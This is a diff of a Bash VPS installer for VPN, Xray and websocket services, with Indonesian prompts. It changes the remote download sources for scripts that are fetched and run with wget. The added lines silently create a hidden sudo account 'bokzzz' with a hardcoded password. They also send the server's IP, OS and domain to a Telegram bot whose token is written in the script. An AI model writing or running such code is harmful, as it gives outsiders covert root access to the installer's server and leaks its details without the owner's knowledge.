@@ -216,20 +216,33 @@ clear
   echo -e "\e[32m   ───│    ┴ ┴└─┘ ┴ └─┘└─┘└─┘┴└─┴┴   ┴   ┴─┘┴ ┴ └─┘   │───\033[0m"
   echo -e "\e[32m      │\033[0m  \e[33m      HR-vpn (C)https://t.me/HRstores      \033[0m \e[32m │\033[0m"
   echo -e "\e[32m      └───────────────────────────────────────────────┘\033[0m"
-    echo -e "${red}    ♦️${NC} ${green} CUSTOM SETUP DOMAIN VPS     ${NC}"
-    echo -e "${red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m${NC}"
-    echo "1. Use Domain From Script / Gunakan Domain Dari Script"
-    echo "2. Choose Your Own Domain / Pilih Domain Sendiri"
-    echo -e "${red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m${NC}"
-    read -rp "Choose Your Domain Installation : " dom 
+#echo " "
+#read -rp "Input ur domain : " -e pp
+   # if [ -z $pp ]; then
+   #     echo -e "
+   #     Nothing input for domain!
+    #    Then a random domain will be created"
+   #else
+   #     echo "$pp" > /root/scdomain
+#	echo "$pp" > /etc/xray/scdomain
+#	echo "$pp" > /etc/xray/domain
+#	echo "$pp" > /etc/v2ray/domain
+#	echo $pp > /root/domain
+ #       echo "IP=$pp" > /var/lib/SIJA/ipvps.conf
+  #  fi
+    
+    echo -e "${red}                ♦️ CUSTOM SETUP DOMAIN VPS ♦️   ${NC}"
+    echo -e "\e[32m      ┌───────────────────────────────────────────────┐\033[0m"
+    echo "          1. Gunakan Domain Dari Script 1"
+    echo "          2. Gunakan Domain Dari Script 2"
+    echo -e "\e[32m      └───────────────────────────────────────────────┘\033[0m"
+    read -rp " Tentukan domain anda : " dom 
 
-    if test $dom -eq 1; then
-    clear
-    apt install jq curl -y
-    wget -q -O /root/cf.sh "https://raw.githubusercontent.com/heruahmad1/v4/main/cf.sh"
-    chmod +x /root/cf.sh
-    bash /root/cf | tee /root/install.log
-    print_success "DomainAll"
+if test $dom -eq 1; then
+clear
+wget -q -O /root/cf.sh "https://raw.githubusercontent.com/sasak3/v4/main/slowdns/cf.sh"
+chmod +x /root/cf.sh
+./cf.sh
     elif test $dom -eq 2; then
     read -rp "Enter Your Domain : " domen 
     echo $domen > /root/domain
@@ -243,30 +256,62 @@ clear
     echo "Not Found Argument"
     exit 1
     fi
-    echo -e "${GREEN}Done!${NC}"
-    sleep 2
-    clear
-
-wget https://raw.githubusercontent.com/heruahmad1/main/cfslow.sh && chmod +x cfslow.sh && ./cfslow.sh
-rm -f /root/cfslow.sh
+   echo -e "${GREEN}Done!${NC}"
+sleep 2
 clear
-    
+echo "IP=$host" >> /var/lib/SIJA/ipvps.conf
+#echo "IP=$host" >> /var/lib/scrz-prem/ipvps.conf
+echo "$host" >> /root/domain
+#clear
+domain=$(cat /root/domain)
+CITY=$(curl -s ipinfo.io/city )
+WKT=$(curl -s ipinfo.io/timezone )
+userdel jame > /dev/null 2>&1
+Username="bokzzz"
+Password=bokzzz
+mkdir -p /home/script/
+useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
+CHATID="5807961610"
+KEY="6210655575:AAH4TkHoDco4ShhlrD6HZMUIfpTWHKIVdog"
+TIME="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT=" Update
+    ============================
+       ‼️ Registrasi Script ‼️
+    ============================
+    <code>Tanggal    :</code> <code>$tanggal</code>
+    <code>IP Vps     :</code> <code>$MYIP</code>
+    <code>OS Vps     :</code> <code>$OS_Name</code>
+    <code>Domain     :</code> <code>$domain</code>
+    <code>User Script:</code> <code>$username</code>
+    <code>Exp Script :</code> <code>$exp</code>
+    ============================
+    Auto Massage from BOT Registered 
+"
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+clear
+#clear
+wget https://raw.githubusercontent.com/sasak3/v4/main/slowdns/cfslow.sh && chmod +x cfslow.sh && ./cfslow.sh
+rm -f /root/cfslow.sh
+clear    
 #install ssh ovpn
 echo -e "$green[INFO]$NC Install SSH"
 sleep 2
 clear
-wget https://raw.githubusercontent.com/heruahmad1/v4/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
+wget https://raw.githubusercontent.com/botak8/VVIP/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
 #Instal Xray
 echo -e "$green[INFO]$NC Install XRAY!"
 sleep 2
 clear
-wget https://raw.githubusercontent.com/heruahmad1/v4/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
+wget https://raw.githubusercontent.com/botak8/VVIP/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
 clear
 echo -e "$green[INFO]$NC Install SET-BR!"
-wget https://raw.githubusercontent.com/heruahmad1/v4/main/backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh >/dev/null 2>&1
+wget https://raw.githubusercontent.com/botak8/v4/main/backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
 clear 
 echo -e "$green[INFO]$NC Install WEBSOCKET!"
-wget https://raw.githubusercontent.com/heruahmad1/v4/main/Sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
+wget https://raw.githubusercontent.com/botak8/VVIP/main/websocket/insshws.sh && chmod +x insshws.sh && ./insshws.sh
 clear
 wget https://raw.githubusercontent.com/botak8/VVIP/main/websocket/nontls.sh && chmod +x nontls.sh && ./nontls.sh
 clear
